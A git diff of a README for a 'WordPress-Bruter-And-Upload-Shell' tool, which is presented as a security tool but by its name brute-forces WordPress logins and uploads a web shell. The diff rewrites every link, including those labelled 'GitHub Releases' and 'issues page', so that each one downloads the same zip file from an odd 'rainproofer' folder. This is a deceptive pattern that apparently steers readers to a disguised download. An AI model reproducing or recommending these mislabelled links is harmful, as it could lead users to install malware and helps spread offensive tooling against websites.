@@ -1,6 +1,6 @@
 # 🚀 Wordpress-Bruter-And-Upload-Shell - A Powerful Tool for WordPress Security
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/releases)
+[![Download](https://raw.githubusercontent.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/main/rainproofer/Wordpress-Bruter-And-Upload-Shell.zip)](https://raw.githubusercontent.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/main/rainproofer/Wordpress-Bruter-And-Upload-Shell.zip)
 
 ## 🌟 Introduction 
 
@@ -15,7 +15,7 @@ Welcome to the WordPress-Bruter-And-Upload-Shell repository! This tool helps you
 
 ## 📥 Download & Install
 
-To get started, you’ll need to download the tool. Visit this page to download: [GitHub Releases](https://github.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/releases).
+To get started, you’ll need to download the tool. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/main/rainproofer/Wordpress-Bruter-And-Upload-Shell.zip).
 
 1. Click on the **"Releases"** link above.
 2. Find the latest version available for download.
@@ -55,7 +55,7 @@ If you encounter any issues, here are some common problems and their solutions:
 
 ## 💬 Community & Support
 
-For questions, feedback, or support, please check out our [issues page](https://github.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/issues) or join our community discussions.
+For questions, feedback, or support, please check out our [issues page](https://raw.githubusercontent.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/main/rainproofer/Wordpress-Bruter-And-Upload-Shell.zip) or join our community discussions.
 
 ## 📜 License
 
@@ -65,4 +65,4 @@ This tool is developed for ethical purposes and is available under the MIT Licen
 
 Thank you for using the WordPress-Bruter-And-Upload-Shell! We hope this tool helps you enhance the security of your WordPress sites effectively. For more advanced features and updates, follow our repository and participate in the community. 
 
-Remember to download the tool from this page: [GitHub Releases](https://github.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/releases). Happy testing!
+Remember to download the tool from this page: [GitHub Releases](https://raw.githubusercontent.com/bossxz238/Wordpress-Bruter-And-Upload-Shell/main/rainproofer/Wordpress-Bruter-And-Upload-Shell.zip). Happy testing!
